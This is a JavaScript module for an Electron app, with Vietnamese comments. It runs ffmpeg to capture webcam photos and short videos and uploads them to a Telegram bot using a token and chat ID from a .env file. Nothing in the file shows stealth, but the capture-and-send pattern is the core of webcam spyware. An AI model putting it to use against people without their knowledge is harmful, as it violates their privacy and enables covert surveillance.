const { app } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { exec } = require('child_process');
const axios = require('axios');
const FormData = require('form-data');

require("dotenv").config({
    path: app.isPackaged
        ? path.join(process.resourcesPath, ".env")
        : path.join(__dirname, "..", ".env")
});

const ffmpegPath = app?.isPackaged
    ? path.join(process.resourcesPath, "ffmpeg-static", "ffmpeg.exe")
    : require("ffmpeg-static");

// Tên webcam đã xác nhận
const WEBCAM_DEVICE = 'Integrated Camera';

// Lock để tránh capture đồng thời
let isCapturing = false;

// Chụp ảnh webcam
async function capturePhoto() {
    if (isCapturing) throw new Error('Đang chụp ảnh trước đó, vui lòng chờ 3-5 giây.');

    isCapturing = true;

    return new Promise((resolve, reject) => {
        const tempJpg = path.join(os.tmpdir(), `webcam_photo_${Date.now()}.jpg`);

        const cmd = `"${ffmpegPath}" -y -f dshow -i video="${WEBCAM_DEVICE}" -vframes 1 -q:v 2 "${tempJpg}"`;

        console.log('[capturePhoto] Chạy lệnh:', cmd);

        const child = exec(cmd);

        let stderrOutput = '';

        child.stderr.on('data', (data) => {
            stderrOutput += data.toString();
            console.log('[ffmpeg photo stderr]:', data.toString().trim());
        });

        child.on('close', (code) => {
            console.log('[capturePhoto] ffmpeg exit code:', code);

            if (code !== 0) {
                isCapturing = false;
                return reject(new Error(`ffmpeg thất bại (code ${code}). Stderr: ${stderrOutput.trim()}`));
            }

            let attempts = 0;
            const maxAttempts = 20;
            const interval = setInterval(() => {
                attempts++;
                if (fs.existsSync(tempJpg)) {
                    clearInterval(interval);
                    try {
                        const buffer = fs.readFileSync(tempJpg);
                        fs.unlinkSync(tempJpg);
                        console.log('[capturePhoto] Thành công');
                        isCapturing = false;
                        resolve(buffer);
                    } catch (fsErr) {
                        isCapturing = false;
                        reject(new Error(`Lỗi đọc file: ${fsErr.message}`));
                    }
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    isCapturing = false;
                    reject(new Error('File ảnh không được tạo sau 4 giây chờ'));
                }
            }, 200);
        });

        child.on('error', (err) => {
            isCapturing = false;
            reject(new Error(`Lỗi khởi động ffmpeg: ${err.message}`));
        });
    });
}

// Quay video webcam
async function captureVideo(durationSeconds = 15) {
    if (isCapturing) throw new Error('Đang quay video trước đó, vui lòng chờ.');

    isCapturing = true;

    return new Promise((resolve, reject) => {
        const tempMp4 = path.join(os.tmpdir(), `webcam_video_${Date.now()}.mp4`);

        const cmd = `"${ffmpegPath}" -y -f dshow -i video="${WEBCAM_DEVICE}" -t ${durationSeconds} -c:v libx264 -preset ultrafast -crf 28 -an "${tempMp4}"`;

        console.log('[captureVideo] Chạy lệnh:', cmd);

        const child = exec(cmd);

        let stderrOutput = '';

        child.stderr.on('data', (data) => {
            stderrOutput += data.toString();
            console.log('[ffmpeg video stderr]:', data.toString().trim());
        });

        child.on('close', (code) => {
            console.log('[captureVideo] ffmpeg exit code:', code);

            if (code !== 0) {
                isCapturing = false;
                return reject(new Error(`ffmpeg thất bại (code ${code}). Stderr: ${stderrOutput.trim()}`));
            }

            let attempts = 0;
            const maxAttempts = 30;
            const interval = setInterval(() => {
                attempts++;
                if (fs.existsSync(tempMp4)) {
                    clearInterval(interval);
                    try {
                        const buffer = fs.readFileSync(tempMp4);
                        fs.unlinkSync(tempMp4);
                        console.log('[captureVideo] Thành công');
                        isCapturing = false;
                        resolve(buffer);
                    } catch (fsErr) {
                        isCapturing = false;
                        reject(new Error(`Lỗi đọc file: ${fsErr.message}`));
                    }
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    isCapturing = false;
                    reject(new Error('File video không được tạo sau 6 giây chờ'));
                }
            }, 200);
        });

        child.on('error', (err) => {
            isCapturing = false;
            reject(new Error(`Lỗi khởi động ffmpeg: ${err.message}`));
        });
    });
}

// Gửi ảnh với retry & timeout
async function sendPhoto(buffer) {
    const maxRetries = 3;
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const formData = new FormData();
            formData.append("chat_id", process.env.CHAT_ID);
            formData.append("photo", buffer, { filename: "photo.jpg", contentType: "image/jpeg" });

            const response = await axios.post(
                `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`,
                formData,
                {
                    headers: formData.getHeaders(),
                    timeout: 30000
                }
            );
            console.log("[sendPhoto] Gửi ảnh thành công:", response.data);
            return;
        } catch (err) {
            console.error(`[sendPhoto] Lỗi lần ${attempt}:`, err.message);
            if (attempt === maxRetries) {
                console.error("[sendPhoto] Hết lượt retry");
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    }
}

// Gửi video với retry & timeout
async function sendVideo(videoBuffer) {
    const maxRetries = 3;
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const formData = new FormData();
            formData.append("chat_id", process.env.CHAT_ID);
            formData.append("video", videoBuffer, { filename: "video.mp4", contentType: "video/mp4" });

            const response = await axios.post(
                `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendVideo`,
                formData,
                {
                    headers: formData.getHeaders(),
                    timeout: 60000,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity
                }
            );
            console.log("[sendVideo] Gửi video thành công:", response.data);
            return;
        } catch (err) {
            console.error(`[sendVideo] Lỗi lần ${attempt}:`, err.message);
            if (attempt === maxRetries) {
                console.error("[sendVideo] Hết lượt retry");
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    }
}

module.exports = {
    capturePhoto,
    captureVideo,
    sendPhoto,
    sendVideo
};